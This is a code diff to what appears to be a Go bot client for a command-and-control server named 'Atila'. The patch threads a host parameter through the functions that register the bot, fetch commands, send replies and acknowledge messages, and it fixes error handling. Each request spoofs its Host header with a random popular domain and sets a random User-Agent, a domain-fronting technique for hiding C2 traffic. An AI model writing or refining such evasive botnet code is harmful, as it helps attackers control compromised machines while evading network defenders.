@@ -60,23 +60,27 @@ type MessageAck struct {
 
 // inboxReader is a loop of fetching and interpreting messages.
 // Returns true if the operation was successful, false if it didn't.
-func inboxReader(id string) bool {
-	messages := fetchMessages(id)
+func inboxReader(host, id string) bool {
+	messages, err := fetchMessages(host, id)
+	if err != nil {
+		fmt.Println(err.Error())
+		return false
+	}
 
 	for _, message := range messages {
-		reply, err := interpretMessage(message)
+		reply, err := interpretMessage(host, message)
 		if err != nil {
 			fmt.Println(err.Error())
 			continue
 		}
 
-		err = sendMessage(reply)
+		err = sendMessage(host, reply)
 		if err != nil {
 			fmt.Println(err.Error())
 			continue
 		}
 
-		err = messageAck(reply.ReplyTo)
+		err = messageAck(host, reply.ReplyTo)
 		if err != nil {
 			fmt.Println(err.Error())
 			continue
@@ -87,7 +91,7 @@ func inboxReader(id string) bool {
 }
 
 // identify makes the bot known to the Atila server. Returns true if identification was successful.
-func identify(id string, publicKey *rsa.PublicKey) bool {
+func identify(host, id string, publicKey *rsa.PublicKey) bool {
 	// Bot's identification details which will be stored in the Atila's database.
 	details := IdentifyPayload{
 		Id:        id,
@@ -107,7 +111,7 @@ func identify(id string, publicKey *rsa.PublicKey) bool {
 		return false
 	}
 
-	request, err := http.NewRequest("POST", atilaHost+"/v1/clients", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+"/v1/clients", bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
@@ -125,9 +129,9 @@ func identify(id string, publicKey *rsa.PublicKey) bool {
 	}
 	defer response.Body.Close()
 
-	// StatusOK - We have been inserted into the database.
+	// StatusNoContent - We have been inserted into the database.
 	// StatusConflict - We are already in the database.
-	if response.StatusCode != http.StatusOK || response.StatusCode != http.StatusConflict {
+	if response.StatusCode != http.StatusCreated && response.StatusCode != http.StatusConflict {
 		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode))
 		return false
 	}
@@ -136,7 +140,7 @@ func identify(id string, publicKey *rsa.PublicKey) bool {
 }
 
 // messageAck changes a message's state. This will prevent the Atila from sending that message again.
-func messageAck(messageId string) error {
+func messageAck(host, messageId string) error {
 	messageAck := MessageAck{
 		Id:     messageId,
 		Status: "SEEN",
@@ -152,7 +156,7 @@ func messageAck(messageId string) error {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", atilaHost+"/v1/messages/ack", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+"/v1/messages/ack", bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
@@ -175,7 +179,7 @@ func messageAck(messageId string) error {
 }
 
 // sendMessage makes a POST request to Atila which saves the message reply.
-func sendMessage(message Message) error {
+func sendMessage(host string, message Message) error {
 	insertionJson, err := json.Marshal(message)
 	if err != nil {
 		return err
@@ -186,7 +190,7 @@ func sendMessage(message Message) error {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", atilaHost+"/v1/messages", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+"/v1/messages", bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
@@ -205,7 +209,7 @@ func sendMessage(message Message) error {
 }
 
 // interpretMessage given the message it will generate a reply message.
-func interpretMessage(message Message) (Message, error) {
+func interpretMessage(host string, message Message) (Message, error) {
 	var reply Message = Message{
 		From:    message.To,
 		ReplyTo: message.Id,
@@ -292,12 +296,14 @@ func interpretMessage(message Message) (Message, error) {
 
 // fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
 // Do remember to ack. the message after interpreting it and issue the response.
-func fetchMessages(id string) []Message {
-	request, err := http.NewRequest("GET", atilaHost+"/v1/messages?status=SENT&clientId="+id, nil)
+func fetchMessages(host, id string) ([]Message, error) {
+	var messages []Message
+
+	request, err := http.NewRequest("GET", host+"/v1/messages?status=SENT&clientId="+id, nil)
 	request.Host = randomPopularDomain()
 	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
-		fmt.Println(err.Error())
+		return messages, err
 	}
 
 	client := &http.Client{}
@@ -309,13 +315,10 @@ func fetchMessages(id string) []Message {
 
 	jsonDecoder := json.NewDecoder(response.Body)
 	jsonDecoder.DisallowUnknownFields()
-
-	var messages []Message
-
 	jsonErr := jsonDecoder.Decode(&messages)
 	if jsonErr != nil {
-		fmt.Println(jsonErr.Error())
+		return messages, err
 	}
 
-	return messages
+	return messages, nil
 }
